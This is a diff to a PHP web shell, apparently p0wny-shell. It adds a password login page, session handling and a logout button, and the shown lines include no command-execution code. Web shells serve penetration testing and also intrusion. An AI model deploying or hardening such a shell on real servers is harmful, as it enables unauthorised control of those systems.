@@ -1,5 +1,116 @@
 <?php
 
+session_start();
+
+// Generate password's hash with
+// php -r "echo password_hash('yourstrongpassword', PASSWORD_DEFAULT );"
+// Comment to remove password protection
+$PASSWD = '$2y$10$xTVjPTvVllWTgjf3YBlK7OmJiP9YG/aml5bCJdbFiS41LKAqyquBa'; 
+
+function isAuthenticated() {
+    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
+}
+
+// Handle authentication
+if (isset($_POST['password'])) {
+    if (password_verify($_POST['password'], $PASSWD)) {
+        $_SESSION['authenticated'] = true;
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $login_error = "You don't have any superpowers....";
+    }
+}
+
+// Handle logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Handle login form display
+if (isset($PASSWD) && strlen($PASSWD) !== 0 && !isAuthenticated()) {
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <title>p0wny@shell:~#</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #333;
+            color: #eee;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background: #222;
+            padding: 40px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, .5);
+            text-align: center;
+        }
+        .login-box h2 {
+            color: #1BC9E7;
+            margin-top: 0;
+        }
+        .login-box input[type="password"] {
+            width: 250px;
+            padding: 10px;
+            margin: 20px 0;
+            background: #333;
+            border: 1px solid #555;
+            color: #eee;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        .login-box input[type="submit"] {
+            padding: 10px 30px;
+            background: #75DF0B;
+            border: none;
+            color: #222;
+            font-family: monospace;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .login-box input[type="submit"]:hover {
+            background: #5bc000;
+        }
+        .error {
+            color: #ff4444;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Authentication required</h2>
+        <?php if (isset($login_error)): ?>
+            <div class="error"><?php echo $login_error; ?></div>
+        <?php endif; ?>
+        <form method="POST">
+            <input type="password" name="password" placeholder="Password" required autofocus />
+            <br>
+            <input type="submit" value="Login" />
+        </form>
+    </div>
+</body>
+</html>
+
+<?php
+    exit;
+}
+
+// Beyond this point, user is authenticated or no password protection is set
 $SHELL_CONFIG = array(
     'username' => 'p0wny',
     'hostname' => 'shell',
@@ -248,6 +359,24 @@ if (isset($_GET["feature"])) {
                 font-weight: bold;
                 color: #FF4180;
                 text-align: center;
+            }
+
+            #logout-btn {
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                padding: 5px 15px;
+                background: #1BC9E7;;
+                color: #eee;
+                border: none;
+                cursor: pointer;
+                font-family: monospace;
+                font-size: 10pt;
+                border-radius: 3px;
+            }
+
+            #logout-btn:hover {
+                background: #17b2ceff;
             }
 
             :root {
@@ -607,6 +736,13 @@ if (isset($_GET["feature"])) {
     </head>
 
     <body>
+<?php
+if (isset($PASSWD) && strlen($PASSWD)) {
+?>
+    <button id="logout-btn" onclick="window.location.href='?logout'">Logout</button>
+<?php
+}
+?>
         <div id="shell">
             <pre id="shell-content">
                 <div id="shell-logo">
